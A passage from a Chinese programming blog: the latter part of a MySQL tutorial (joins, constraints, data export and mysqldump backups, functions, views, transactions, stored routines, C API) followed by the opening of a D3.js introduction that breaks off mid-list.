-&gt; (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> CustomerId <span class="keyword">FROM</span> Reservations);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost &lt;
-&gt; (<span class="keyword">SELECT</span> AVG(Cost) <span class="keyword">FROM</span> Cars);
</code></pre><p><code>EXISTS</code>和<code>NOT EXISTS</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> EXISTS
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span>
-&gt; Customers.CustomerId=Reservations.CustomerId);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> <span class="keyword">NOT</span> EXISTS    
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> 
-&gt; Customers.CustomerId=Reservations.CustomerId);
</code></pre><h2 id="限制">限制</h2><p>限制用来限定列的类型。</p>
<p><code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE People(Id <span class="built_in">INTEGER</span>, LastName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL,
-&gt;                     FirstName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL, City VARCHAR(<span class="number">55</span>));
</code></pre><p><code>UNIQUE</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>PRIMARY KEY</code>自动拥有<code>UNIQUE</code>和<code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER PRIMARY KEY, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>FOREIGN KEY</code>是指向另一个表主键的索引，用来联系两个表：</p>
<pre><code>mysql&gt; CREATE TABLE Books<span class="list">(<span class="keyword">BookId</span> INTEGER PRIMARY KEY, Title VARCHAR<span class="list">(<span class="number">50</span>)</span>,
    -&gt; AuthorId INTEGER, FOREIGN KEY<span class="list">(<span class="keyword">AuthorId</span>)</span> REFERENCES Authors<span class="list">(<span class="keyword">AuthorId</span>)</span>)</span>
    -&gt; type=InnoDB<span class="comment">;</span>
</code></pre><p><code>ENUM</code>可以是列出中的一个：</p>
<pre><code>mysql&gt; CREATE TABLE Shops<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Quality ENUM<span class="list">(<span class="quoted">'High</span>', <span class="quoted">'Average</span>', <span class="quoted">'Low</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>可以是零个或多个：</p>
<pre><code>mysql&gt; CREATE TABLE Students<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Certificates SET<span class="list">(<span class="quoted">'A1</span>', <span class="quoted">'A2</span>', <span class="quoted">'B1</span>', <span class="quoted">'C1</span>')</span>)</span><span class="comment">; </span>
</code></pre><p>注意插入时<code>Certificates</code>列的值用括号括起来，之间用逗号分隔且不能有空格。</p>
<pre><code>mysql&gt; INSERT INTO <span class="function">Students <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Mark'</span>, <span class="string">'A1,A2,D1,D2'</span>)</span></span>;
</code></pre><h2 id="导出和导入数据">导出和导入数据</h2><p>简单导出到文件和导入到数据库：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">INTO</span> OUTFILE <span class="comment">'/tmp/cars';  # 空格分隔</span>
mysql&gt; LOAD DATA INFILE <span class="comment">'/tmp/cars.csv' INTO TABLE Cars</span>
-&gt; FIELDS TERMINATED <span class="keyword">BY</span> <span class="comment">',';</span>
</code></pre><p>导入到xml文件：</p>
<pre><code>$ mysql -uroot -p --<span class="keyword">xml</span> <span class="title">-e</span> 'SELECT * FROM mydb.Cars' &gt; /tmp/cars.<span class="keyword">xml</span>
<span class="title">mysql</span>&gt; LOAD <span class="keyword">XML</span> <span class="title">/tmp</span>/cars.<span class="keyword">xml</span> <span class="title">INTO</span> TABLE Cars;
</code></pre><p>使用mysqldump工具：</p>
<p>只保存数据结构：</p>
<pre><code>$ mysqldump -<span class="keyword">u</span> root -p --<span class="keyword">no</span>-data mydb &gt; bkp1.sql
</code></pre><p>只保存数据</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> --no-create-info mydb &gt; bkp2.sql
</code></pre><p>完整数据库</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> mydb &gt; bkp3.sql
</code></pre><p>恢复数据：</p>
<pre><code>mysql&gt; CREATE DATABASE mydb<span class="comment">;</span>
mysql&gt; USE mydb<span class="comment">;</span>
mysql&gt; source bkp3.sql
</code></pre><h2 id="连接表">连接表</h2><h3 id="内连接">内连接</h3><p>分<code>INNER JOIN</code>、<code>NATURAL INNER JOIN</code>和<code>CROSS INNER JOIN</code>三种， <code>INNER</code>关键字可省略。以下是<code>INNER JOIN</code></p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers <span class="keyword">AS</span> C <span class="keyword">JOIN</span> Reservations 
    -&gt; <span class="keyword">AS</span> R <span class="keyword">ON</span> C.CustomerId=R.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers, Reservations
    -&gt; <span class="keyword">WHERE</span> Customers.CustomerId=Reservations.CustomerId;
</code></pre><p><code>CROSS JOIN</code>是两个表的笛卡尔乘积。</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers CROSS <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers, Reservations;
</code></pre><h3 id="外连接">外连接</h3><p>左内连，选取左边所有的值：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; <span class="keyword">ON</span> Customers.CustomerId=Reservations.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; USING (CustomerId);
</code></pre><p>右内连，同上，孤单的右边值对应的左边为<code>NULL</code></p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers RIGHT <span class="built_in">JOIN</span>
    -&gt; Reservations USING (CustomerId);
</code></pre><p>自然连，会把所有列连在一起：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers NATURAL <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers 
    -&gt; NATURAL LEFT <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers
    -&gt; NATURAL RIGHT <span class="built_in">JOIN</span> Reservations;
</code></pre><h2 id="MySQL函数">MySQL函数</h2><h3 id="数学函数">数学函数</h3><pre><code>mysql&gt; <span class="tag">SELECT</span> <span class="function">RAND</span>(), <span class="function">ABS</span>(-3), <span class="function">PI</span>(), <span class="function">SIN</span>(0<span class="class">.5</span>),
     &gt; <span class="function">BIN</span>(22), <span class="function">OCT</span>(22), <span class="function">HEX</span>(22)
     &gt; <span class="function">CEIL</span>(11<span class="class">.256</span>), <span class="function">FLOOR</span>(11<span class="class">.256</span>), <span class="function">ROUND</span>(11<span class="class">.256</span>, 2),
     &gt; <span class="function">POW</span>(3, 3), <span class="function">SQRT</span>(9),
     &gt; <span class="function">DEGREES</span>(2*<span class="function">PI</span>());
</code></pre><h3 id="聚合函数">聚合函数</h3><pre><code>mysql&gt; SELECT MIN<span class="function"><span class="params">(Cost)</span>, <span class="title">MAX</span><span class="params">(Cost)</span>, <span class="title">AVG</span><span class="params">(Cost)</span>
    -&gt;</span> FROM Cars;
mysql&gt; SELECT SUM(Cost), COUNT(Id), STD(Cost),<span class="function"> 
    -&gt;</span> VARIANCE(Cost) FROM Cars;
</code></pre><h3 id="字符串函数">字符串函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> LENGTH(<span class="string">'ZetCode'</span>), UPPER(<span class="string">'ZetCode'</span>), LOWER(<span class="string">'ZetCode'</span>);
mysql&gt; <span class="keyword">SELECT</span> LPAD(RPAD(<span class="string">"ZetCode"</span>, <span class="number">10</span>, <span class="string">"*"</span>), <span class="number">13</span>, <span class="string">"*"</span>);
mysql&gt; <span class="keyword">SELECT</span> REVERSE(<span class="string">'ZetCode'</span>), REPEAT(<span class="string">'*'</span>, <span class="number">6</span>);
mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), <span class="keyword">RIGHT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), 
    -&gt; SUBSTRING(<span class="string">'ZetCode'</span>, <span class="number">3</span>, <span class="number">3</span>);
mysql&gt; <span class="keyword">SELECT</span> STRCMP(<span class="string">'byte'</span>, <span class="string">'byte'</span>), CONCAT(<span class="string">'three'</span>, <span class="string">' apples'</span>);
mysql&gt; <span class="keyword">SELECT</span> REPLACE(<span class="string">'basketball'</span>, <span class="string">'basket'</span>, <span class="string">'foot'</span>);
</code></pre><h3 id="日期时间函数">日期时间函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DAYNAME</span>(<span class="string">'2011-01-23'</span>), <span class="keyword">YEAR</span>(<span class="string">'2011/01/23'</span>),
    -&gt; <span class="keyword">MONTHNAME</span>(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> NOW();
mysql&gt; <span class="keyword">SELECT</span> CURTIME(), CURDATE();
mysql&gt; <span class="keyword">SELECT</span> DATEDIFF(<span class="string">'2011-3-12'</span>, <span class="string">'2011-1-12'</span>);
mysql&gt; <span class="keyword">SELECT</span> WEEKOFYEAR(<span class="string">'110123'</span>), <span class="keyword">WEEKDAY</span>(<span class="string">'110123'</span>),
    -&gt; QUARTER(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_FORMAT(<span class="string">'110123'</span>, <span class="string">'%d-%m-%Y'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_ADD(<span class="string">'110123'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>), 
    -&gt; SUBDATE(<span class="string">'110309'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>);
</code></pre><h3 id="系统函数">系统函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> VERSION(), DATABASE()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> USER()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> CHARSET(<span class="string">'ZetCode'</span>), COLLATION(<span class="string">'ZetCode'</span>)<span class="comment">;</span>
</code></pre><h2 id="MySQL视图">MySQL视图</h2><p>视图是一种从表中切取的特殊伪表。有以下限制：</p>
<ul>
<li><code>SELECT</code>不能包含子查询</li>
<li><code>SELECT</code>语句不能指向系统或用户变量</li>
<li>在定义中指向的任何表或视图必须存在</li>
<li>不能创建临时视图</li>
<li>一个视图不能被触发关联。</li>
</ul>
<p>创建、更改和删除视图：</p>
<pre><code>mysql&gt; CREATE VIEW CheapCars <span class="keyword">AS</span> 
    -&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost&lt;<span class="number">25000</span>;
mysql&gt; ALTER VIEW CheapCars <span class="keyword">AS</span> <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars
    -&gt; <span class="keyword">WHERE</span> Cost&lt;<span class="number">30000</span>;
mysql&gt; DROP VIEW CheapCars;
</code></pre><p>找到视图：</p>
<pre><code>mysql&gt; SHOW FULL TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME, TABLE_TYPE <span class="keyword">FROM</span> information_schema.TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.VIEWS;
</code></pre><p><code>UNION</code>被用来结合两个或更多<code>SELECT</code>语句得到的结果集，可以通过<code>UNION</code>创建视图</p>
<pre><code>mysql&gt; CREATE VIEW FavoriteCars <span class="keyword">AS</span>
    -&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">7</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">4</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">5</span>;
</code></pre><h2 id="事务">事务</h2><p>数据库并发操作控制单位。这些操作可以commit可以回滚。</p>
<p>解释下ACID。</p>
<h3 id="隔离级">隔离级</h3><ul>
<li>序列，一个接一个</li>
<li>重复读，读的时候其它事务没提交就没法修改，改的时候没提交其它事务就没法读，默认级别。</li>
<li>读提交。</li>
<li>读未提交。</li>
</ul>
<ol>
<li>脏读(事务没提交，提前读取)：脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。 </li>
<li>不可重复读(两次读的不一致) ：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。例如，一个编辑人员两次读取同一文档，但在两次读取之间，作者重写了该文档。当编辑人员第二次读取文档时，文档已更改。原始读取不可重复。如果只有在作者全部完成编写后编辑人员才可以读取文档，则可以避免该问。</li>
<li>幻读 : 是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。例如，一个编辑人员更改作者提交的文档，但当生产部门将其更改内容合并到该文档的主复本时，发现作者已将未编辑的新材料添加到该文档中。如果在编辑人员和生产部门完成对原始文档的处理之前，任何人都不能将新材料添加到文档中，则可以避免该问题。 </li>
</ol>
<p>默认隔离级和可能出现情况：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>Phantom read</th>
<th>Nonrepeatable read</th>
<th>Dirty read</th>
</tr>
</thead>
<tbody>
<tr>
<td>序列化</td>
<td>不可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>可重读</td>
<td>可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读提交</td>
<td>可能</td>
<td>可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读未提交</td>
<td>可能</td>
<td>可能</td>
<td>可能</td>
</tr>
</tbody>
</table>
<p>查看和选择隔离级别</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@tx_isolation</span><span class="comment">;</span>
mysql&gt; SET TRANSACTION ISOLATION LEVEL SERIALIZABLE<span class="comment">;</span>
</code></pre><h3 id="自动提交">自动提交</h3><p>MySQL会自动提交不以<code>START</code>开头的<code>UPDATE</code>和<code>INSERT</code>语句。查看和设置当前设置：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@autocommit</span><span class="comment">;</span>
mysql&gt; SET autocommit=<span class="number">0</span><span class="comment">;</span>
</code></pre><p>提交后的状态无法回滚。<code>ROLLBACK</code></p>
<h3 id="开始事务">开始事务</h3><p>自动提交的命令会被MySQL封装为一个单独的事务。我们也可以用<code>START</code>语句实现。</p>
<pre><code>mysql&gt; <span class="literal">START</span> TRANSACTION;
</code></pre><p>之后可以执行命令提交或者回滚：</p>
<p>提交</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; COMMIT<span class="comment">;</span>
</code></pre><p>回滚</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; ROLLBACK<span class="comment">;</span>
</code></pre><h2 id="在MySQL中存储例程">在MySQL中存储例程</h2><p>在MySQL中存在两种存储例程，一种是过程，一种是函数。</p>
<p>过程用<code>CALL</code>调用，不返回值。函数通过<code>SELECT</code>使用，返回值。</p>
<p>过程存储有利有弊。</p>
<h3 id="一个简单过程">一个简单过程</h3><p>创建<code>AllCars</code>g过程选取<code>Cars</code>表中所有内容：</p>
<pre><code>mysql&gt; <span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">AllCars</span><span class="params">()</span> <span class="title">SELECT</span> * <span class="title">FROM</span> <span class="title">Cars</span>;</span>
mysql&gt; CALL AllCars();
</code></pre><h3 id="一个简单函数">一个简单函数</h3><p>定义过程和函数最好的方法是一个单独的sql文件。以下是创建了一个<code>sql</code>文件。通过<code>CREATE FUNCTION</code>创建函数，通过<code>SELECT</code>语句调用。</p>
<pre><code><span class="comment">-- this function computes the area</span>
<span class="comment">-- of a circle; it takes a radius as</span>
<span class="comment">-- a parameter</span>

DELIMITER $$

<span class="operator"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> CircleArea;</span>

<span class="operator"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> CircleArea(r <span class="keyword">DOUBLE</span>) <span class="keyword">RETURNS</span> <span class="keyword">DOUBLE</span>
<span class="keyword">BEGIN</span>
    <span class="keyword">DECLARE</span> area <span class="keyword">DOUBLE</span>;</span>

    <span class="operator"><span class="keyword">SET</span> area = r * r * <span class="keyword">pi</span>();</span>
    RETURN area;
<span class="operator"><span class="keyword">END</span> 

$$

DELIMITER ;</span>
</code></pre><p>函数调用：</p>
<pre><code>mysql&gt; source circlearea.sql
mysql&gt; <span class="function">SELECT <span class="title">CircleArea</span><span class="params">(<span class="number">5.5</span>)</span></span>;
</code></pre><h3 id="过程参数">过程参数</h3><p>有三种参数内型：</p>
<ul>
<li>IN，传递给过程，只能在函数内修改</li>
<li>OUT，输出参数，并不从外部传递给过程</li>
<li>INOUT，混合内型，可以传递给过程来更改也可以在过程外部存取。</li>
</ul>
<p>在sql文件中定义过程：</p>
<pre><code>-- this <span class="function"><span class="keyword">procedure</span> <span class="title">computes</span> <span class="title">the</span> <span class="title">power</span> 
-- <span class="title">of</span> <span class="title">a</span> <span class="title">given</span> <span class="title">value</span>

<span class="title">DELIMITER</span> $$

<span class="title">DROP</span> <span class="title">PROCEDURE</span> <span class="title">IF</span> <span class="title">EXISTS</span> <span class="title">Pow</span>;</span>

<span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">Pow</span><span class="params">(<span class="keyword">IN</span> val DOUBLE, <span class="keyword">OUT</span> p DOUBLE)</span> 
<span class="title">BEGIN</span>
    <span class="title">SET</span> <span class="title">p</span> = <span class="title">val</span> * <span class="title">val</span>;</span>
<span class="keyword">END</span> 

$$

DELIMITER ;
</code></pre><p>调用：</p>
<pre><code>mysql&gt; source power.sql

mysql&gt; <span class="built_in">CALL</span> Pow(<span class="number">3</span>, <span class="constant">@p</span>)<span class="comment">;</span>

mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@p</span><span class="comment">;</span>
</code></pre><h3 id="找到过程或函数">找到过程或函数</h3><p>通过<code>SHOW PROCEDURE STATUS</code>和<code>SHOW FUNCTION STATUS</code>查看。</p>
<p>或者</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES  
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'PROCEDURE'</span>;
mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'FUNCTION'</span>;
</code></pre><h2 id="MySQL_C_API">MySQL C API</h2><p>MySQL有个C API</p>
<p>debian上要装这个：</p>
<pre><code>$ sudo apt-<span class="built_in">get</span> install libmysqlclient-<span class="built_in">dev</span>
</code></pre><p>我们只要在头文件中包含<code>mysql.h</code>，编译时以以下方式编译：</p>
<pre><code>$ gcc <span class="property">version</span>.c -o <span class="property">version</span>  `mysql_config <span class="comment">--cflags --libs`</span>
</code></pre><p>基本步骤是先初始化连接：</p>
<pre><code>MYSQL *con = mysql_init(<span class="literal">NULL</span>);

<span class="keyword">if</span> (con == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>再真的连到服务器或某个数据库中：</p>
<pre><code><span class="keyword">if</span> (mysql_real_connect(con, <span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root_pswd"</span>, 
        <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>执行操作：</p>
<pre><code><span class="keyword">if</span> (mysql_query(con, <span class="string">"CREATE DATABASE testdb"</span>)) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>取回数据：</p>
<pre><code><span class="type">MYSQL_RES</span> *<span class="literal">result</span> = mysql_store_result(con);

<span class="keyword">if</span> (<span class="literal">result</span> == <span class="type">NULL</span>) 
{
    finish_with_error(con);
}

<span class="type">int</span> num_fields = mysql_num_fields(<span class="literal">result</span>);

<span class="type">MYSQL_ROW</span> row;

<span class="keyword">while</span> ((row = mysql_fetch_row(<span class="literal">result</span>))) 
{ 
    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) 
    { 
        printf(<span class="string">"%s "</span>, row[i] ? row[i] : <span class="string">"NULL"</span>); 
    } 
        printf(<span class="string">"\n"</span>); 
}

mysql_free_result(<span class="literal">result</span>);
</code></pre><p>还有些其它函数，参考<a href="http://dev.mysql.com/doc/refman/5.1/zh/apis.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.1/zh/apis.html</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/javascript/2014/05/18/a-glance-at-d3js/" itemprop="url">
                  A Glance at D3.js
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-18T00:00:00+08:00" content="2014-05-18">
              2014-05-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/javascript/2014/05/18/a-glance-at-d3js/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="javascript/2014/05/18/a-glance-at-d3js/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>这几天，嗯，跟着<a href="https://www.dashingd3js.com/" target="_blank" rel="external">Dashing D3.js</a>把传说中的D3.js入了个门。</p>
<p>D3在创建基于浏览器的动态数据可视化并带交互真是方便。</p>
<h2 id="从一无所知到数据绑定">从一无所知到数据绑定</h2><h3 id="为何数据可视化">为何数据可视化</h3><ul>
<li>一图胜千言，图形是直观的。</li>
<li>图形是简洁明了的表达方式</li>
<li>世界的数据量是巨大的，图形是好的分析和展示方式</li>
<li>数据是新的石油</li>
</ul>
<h3 id="为何选择D3-js">为何选择D3.js</h3><ul>
<li>D3.js 是基于数据操作文档的JavaScript库。D3帮助你使用HTML，SVG和CSS生动地展现数据。D3不需要你使用某个特定的框架，它的重点在于对主流浏览器的兼容，同时结合了强大的虚拟化组件，以数据驱动的方式去操作DOM。</li>
<li>D3.js由Mike Bostock基于他在斯坦福可视化小组的工作开发，现由其所在的纽约时报赞助。很多贡献者参与到项目的开发，你可以在github上找到这个项目。</li>
<li>D3.js是指Data Driven Documents。当你的网页想要和数据进行交互时，D3是个好的选择。</li>
<li>D3.js被应用到web应用的前端，即用户交互部分。</li>
</ul>
<h3 id="数据可视化流程">数据可视化流程</h3><p>Ben Fry数据可视化流程：</p>
<ul>
<li>获取</li>
<li>解析</li>
<li>过滤</li>
<li>挖掘</li>
<li>呈现</li>
<li>提炼</li>
<li>交互</li>
</ul>
<h3 id="基本构建模块">基本构建模块</h3><ul>
<li>现代浏览器</li>
<li>HTML</li>
<li>CSS</li>
<li>Javascript</li>
<li>DOM</li>
<li>SVG</li>
<li>Web Inspector</li>
</ul>
<h3 id="D3第一步">D3第一步</h3><ul>
<li>在HTML文件中引用云端或本地js库</li>
<li>在Web Inspector控制台中测试</li>
</ul>
<h3 id="添加DOM元素">添加DOM元素</h3><ul>
<li><code>select</code></li>
<li><code>append</code></li>
</ul>
<h3 id="添加SVG元素">添加SVG元素</h3><ul>
<li>js的分行特性</li>
<li><code>style</code>操作符</li>
<li>链式语法</li>
<li><code>select</code>可以被保存赋值</li>
</ul>
<h3 id="将数据绑定到DOM元素上">将数据绑定到DOM元素上</h3><ul>
<li><code>selectAll</code></li>
<li><code>data</code>操作符</li>
<li>虚选择–<a href="http://bost.ocks.org/mike/join/" target="_blank" rel="external">Thinking with Joins</a></li>
<li><code>enter</code>/<code>exit</code>/update</li>
<li>对虚选择的<code>append</code></li>
<li><code>text</code>操作符</li>
<li>数据在<code>__data__</code>属性中</li>
</ul>
<h3 id="使用在DOM元素中的数据">使用在DOM元素中的数据</h3><ul>
<li>向D3.js操作符参数传递函数，</li>
<li>函数第一个参数是<code>__data__</code>内容。</li>
</ul>
<h2 id="使用数据来可视化">使用数据来可视化</h2><h3 id="基于数据创建SVG元素">基于数据创建SVG元素</h3><ul>
<li>创建SVG容器</li>
<li>创建形状元素，比如<code>circle</code></li>
<li>将数据绑定到形状元素(基本靠虚选择完成)</li>
<li>使用<code>style</code>利用数据修饰SVG元素</li>
</ul>
<h3 id="使用SVG坐标空间">使用SVG坐标空间</h3><ul>
<li><p>一图胜千言：</p>
<p>  ———————-&gt; x<br>  | o<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  v y</p>
</li>
<li><p><code>append(&#39;svg&#39;)</code>作为坐标空间</p>
</li>
<li>在SVG坐标空间内放置SVG元素。<code>attr</code></li>
<li>创建SVG元素放置SVG元素</li>
<li>将数据绑定到SVG元素上</li>
<li>利用绑定的数据改变SVG元素的位置</li>
<li>使用绑定的数据修饰SVG元素</li>
</ul>
<h3 id="D3-js接受的数据结构">D3.js接受的数据结构</h3><ul>
<li><code>select</code>到的是数组</li>
<li>D3可以加载外部资源，好多种类</li>
<li>JSON(key一定是字符串)</li>
<li>JSON数组</li>
</ul>
<h3 id="使用D3-js简化代码">使用D3.js简化代码</h3><ul>
<li>将JSON对象绑定到<code>__data__</code>属性上</li>
<li>使用绑定的JSON对象变更SVG元素</li>
</ul>
<h3 id="SVG基本形和D3-js">SVG基本形和D3.js</h3><p>流程固定，设置svg容器，绑定数据，append形状元素，设置必要属性和样式。</p>
<ul>
<li>circle</li>
<li>rect</li>
<li>ellipse</li>
<li>line</li>
<li>polyline/polygon</li>
</ul>
<h3 id="SVG_Path和D3-js">SVG Path和D3.js</h3><ul>
<li>一个用来画画的SVG内置语言</li>
<li>使用D3.js生成形状元素绘制程序(D3.js Path 数据生成器)</li>
</ul>
<h3 id="动态SVG坐标空间">动态SVG坐标空间</h3><p>论如何通过遍历所有数据找到图像边界。</p>
<h3 id="D3-js缩放">D3.js缩放</h3><p>将某个Domain映射到一个Range上的对象/类/函数。</p>
<ul>
